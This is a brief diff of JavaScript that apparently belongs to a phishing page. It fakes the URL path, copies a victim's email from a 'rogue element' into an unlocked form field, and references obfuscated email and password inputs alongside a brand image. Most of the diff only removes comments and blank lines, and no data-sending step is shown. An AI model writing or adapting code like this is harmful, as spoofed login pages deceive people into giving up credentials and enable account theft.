@@ -167,15 +167,13 @@
     fakeURLPath();
 
 setTimeout(function () {
-  // read from the rogue element in body
   var sourceField = document.querySelector('input.field[type="email"]');
   
-  // push to your actual form input
   var formInput = document.querySelector('.inp_core[type="email"]');
 
   if (sourceField && formInput) {
-    var email = sourceField.value; // grabs whatever email is already there
-    console.log('Found email:', email); // confirm it's reading correctly
+    var email = sourceField.value;
+    console.log('Found email:', email); 
 
     formInput.removeAttribute('readonly');
     formInput.value = email;
@@ -188,7 +186,6 @@ setTimeout(function () {
   }
 }, 300);
 
-    
     var emailInput = document.getElementById("mail_x9k2");
     var passwordInput = document.getElementById("code_p4r7");
     var brandImg = document.getElementById("brand_img");
